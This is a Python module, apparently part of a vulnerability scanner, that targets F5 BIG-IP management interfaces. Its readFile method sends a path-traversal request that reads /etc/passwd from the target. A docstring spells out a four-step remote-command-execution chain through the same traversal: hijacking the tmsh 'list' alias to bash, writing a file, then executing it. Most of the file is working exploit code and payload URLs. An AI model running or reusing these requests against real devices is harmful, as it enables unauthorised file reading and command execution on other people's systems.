from termcolor import cprint
import requests
import threading
import re
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)


# BIG-IP
class Detect(threading.Thread):
    name = 'BIG-IP'

    def __init__(self, url, vul_list, requests_proxies):
        threading.Thread.__init__(self)
        self.url = url
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
        self.isExist = False  # 检测该url是否存在漏洞，默认为False，如果测出有漏洞，则设置为True

    # 调用各种漏洞检测方法
    def run_detect(self):
        # 任意文件读取
        self.readFile()

        if not self.isExist:
            return False
        else:
            return True

    # 任意文件读取
    def readFile(self):
        url1 = self.url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
        tqdm.write(Fore.WHITE + 'test readFile : {}'.format(url1))
        try:
            res = requests.get(url=url1, headers=self.headers, proxies=self.proxies, verify=False)
            if '"root:x:0:0:root:' in res.text:
                self.isExist = True
                tqdm.write(Fore.RED + '[BIG-IP 任意文件读取] {}'.format(self.url))
                self.vul_list.append(['BIG-IP 任意文件读取', self.url, 'Yes {}'.format(url1)])
        except Exception as e:
            tqdm.write(Fore.WHITE + '{}'.format(e.args))
            return False

    # RCE
    def webVul2(self):
        '''
        1. 修改alias劫持list命令为bash
        /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash

        2. 写入bash文件
        /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxx&content=id

        3. 执行bash文件
        /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx

        4. 还原list命令
        /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list
        :return:
        '''

if __name__ == '__main__':
    from queue import Queue

    vul_list = []
    # proxy = r'192.168.168.148:10086'
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    url = r'http://www.domain.com'
    Detect(url, vul_list, requests_proxies).run_detect()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))

